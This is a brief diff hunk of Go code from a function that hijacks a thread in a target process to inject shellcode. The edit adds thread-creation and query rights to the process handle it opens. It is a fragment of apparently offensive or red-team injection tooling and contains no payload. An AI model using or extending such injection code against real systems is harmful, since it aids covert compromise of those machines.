@@ -132,7 +132,8 @@ func performThreadHijack(shellcode []byte, pid, tid uint32) (string, error) {
 	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", pid))
 
 	// Step 1: Open target process
-	desiredAccess := uint32(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
+	desiredAccess := uint32(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
+		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
 	hProcess, err := injectOpenProcess(desiredAccess, pid)
 	if err != nil {
 		return sb.String(), fmt.Errorf("failed to open process: %v", err)
